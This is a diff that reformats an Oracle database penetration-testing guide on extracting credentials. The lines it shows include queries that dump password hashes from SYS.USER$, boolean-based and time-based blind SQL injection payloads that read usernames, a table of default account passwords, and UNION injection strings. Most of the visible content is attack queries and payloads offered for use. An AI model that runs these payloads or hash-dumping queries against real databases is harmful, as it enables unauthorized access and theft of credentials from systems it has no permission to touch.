@@ -15,14 +15,14 @@ Extracting database credentials is a critical objective in Oracle database penet
 
 Oracle stores user credential information in several system tables and views:
 
-| Table/View | Description | Access Level Required |
-|------------|-------------|----------------------|
-| `ALL_USERS` | Basic user information | Low (any user) |
-| `DBA_USERS` | Detailed user information | High (DBA role) |
-| `USER_USERS` | Current user information | Low (any user) |
-| `SYS.USER$` | Raw user table with password hashes | Very High (SYS) |
-| `V$SESSION` | Currently connected users | Medium |
-| `V$PWFILE_USERS` | Database administrators | Medium |
+| Table/View       | Description                         | Access Level Required |
+| ---------------- | ----------------------------------- | --------------------- |
+| `ALL_USERS`      | Basic user information              | Low (any user)        |
+| `DBA_USERS`      | Detailed user information           | High (DBA role)       |
+| `USER_USERS`     | Current user information            | Low (any user)        |
+| `SYS.USER$`      | Raw user table with password hashes | Very High (SYS)       |
+| `V$SESSION`      | Currently connected users           | Medium                |
+| `V$PWFILE_USERS` | Database administrators             | Medium                |
 
 ### Current User Context
 
@@ -35,7 +35,7 @@ SELECT USER FROM dual;
 -- Current session details
 SELECT username, osuser, machine, program FROM v$session WHERE audsid = USERENV('SESSIONID');
 
--- Current session privileges 
+-- Current session privileges
 SELECT * FROM session_privs;
 ```
 
@@ -51,7 +51,7 @@ SELECT username, account_status, created FROM all_users ORDER BY created DESC;
 SELECT account_status, COUNT(*) FROM all_users GROUP BY account_status;
 
 -- Find default users that haven't been locked
-SELECT username, account_status FROM all_users 
+SELECT username, account_status FROM all_users
 WHERE username IN ('SYS', 'SYSTEM', 'DBSNMP', 'MDSYS', 'OUTLN', 'SCOTT', 'FLOWS_FILES')
 AND account_status = 'OPEN';
 ```
@@ -60,7 +60,7 @@ AND account_status = 'OPEN';
 
 ```sql
 -- Comprehensive user information (requires higher privileges)
-SELECT username, account_status, profile, authentication_type, 
+SELECT username, account_status, profile, authentication_type,
        created, last_login, expiry_date, default_tablespace
 FROM dba_users ORDER BY created DESC;
 
@@ -80,7 +80,7 @@ SELECT name, password FROM sys.user$ WHERE password IS NOT NULL;
 SELECT name, password, spare4 FROM sys.user$ WHERE password IS NOT NULL;
 
 -- Oracle 12c and later (advanced encryption)
-SELECT name, password versions_pw, spare4 pw12c FROM sys.user$ WHERE password IS NOT NULL; 
+SELECT name, password versions_pw, spare4 pw12c FROM sys.user$ WHERE password IS NOT NULL;
 ```
 
 ### SQL Injection Examples
@@ -109,10 +109,10 @@ SELECT name, password versions_pw, spare4 pw12c FROM sys.user$ WHERE password IS
 
 ```sql
 -- Boolean-based blind
-' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83-- 
+' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83--
 
--- Time-based blind 
-' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83 
+-- Time-based blind
+' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83
      THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
@@ -120,16 +120,16 @@ SELECT name, password versions_pw, spare4 pw12c FROM sys.user$ WHERE password IS
 
 Oracle databases often contain default accounts that may have weak or default passwords:
 
-| Username | Default Password | Description |
-|----------|------------------|-------------|
-| SYS | CHANGE_ON_INSTALL, manager, oracle, sys | Super user account |
-| SYSTEM | MANAGER, oracle, system | System administrator account |
-| SCOTT | TIGER | Demo account |
-| DBSNMP | DBSNMP | Monitoring account |
-| ANONYMOUS | ANONYMOUS | Anonymous web access |
-| CTXSYS | CTXSYS | Oracle Text account |
-| MDSYS | MDSYS | Spatial data account |
-| OUTLN | OUTLN | Stored outlines for optimization |
+| Username  | Default Password                        | Description                      |
+| --------- | --------------------------------------- | -------------------------------- |
+| SYS       | CHANGE_ON_INSTALL, manager, oracle, sys | Super user account               |
+| SYSTEM    | MANAGER, oracle, system                 | System administrator account     |
+| SCOTT     | TIGER                                   | Demo account                     |
+| DBSNMP    | DBSNMP                                  | Monitoring account               |
+| ANONYMOUS | ANONYMOUS                               | Anonymous web access             |
+| CTXSYS    | CTXSYS                                  | Oracle Text account              |
+| MDSYS     | MDSYS                                   | Spatial data account             |
+| OUTLN     | OUTLN                                   | Stored outlines for optimization |
 
 ### Oracle Database Link Credentials
 
@@ -156,7 +156,7 @@ Understanding password policies can aid in guessing or cracking passwords:
 SELECT * FROM dba_profiles WHERE resource_name = 'PASSWORD_VERIFY_FUNCTION';
 
 -- Check password lifetime settings
-SELECT * FROM dba_profiles WHERE resource_name IN 
+SELECT * FROM dba_profiles WHERE resource_name IN
 ('PASSWORD_LIFE_TIME', 'PASSWORD_GRACE_TIME', 'PASSWORD_REUSE_TIME');
 
 -- Find user password settings
@@ -169,11 +169,11 @@ SELECT username, profile FROM dba_users;
 
 ```sql
 -- Search for keywords in stored procedures
-SELECT owner, name, text FROM all_source 
+SELECT owner, name, text FROM all_source
 WHERE UPPER(text) LIKE '%PASSWORD%' OR UPPER(text) LIKE '%CREDENTIALS%';
 
 -- Look for encrypted strings that might be credentials
-SELECT owner, object_name, text FROM all_source 
+SELECT owner, object_name, text FROM all_source
 WHERE text LIKE '%DBMS_CRYPTO%' OR text LIKE '%DBMS_OBFUSCATION_TOOLKIT%';
 ```
 
@@ -199,4 +199,3 @@ SELECT username FROM dba_users WHERE authentication_type = 'GLOBAL';
 -- Look for PDBs in Oracle 12c+ (potential for additional credential sources)
 ' UNION SELECT name,open_mode FROM v$pdbs--
 ```
-
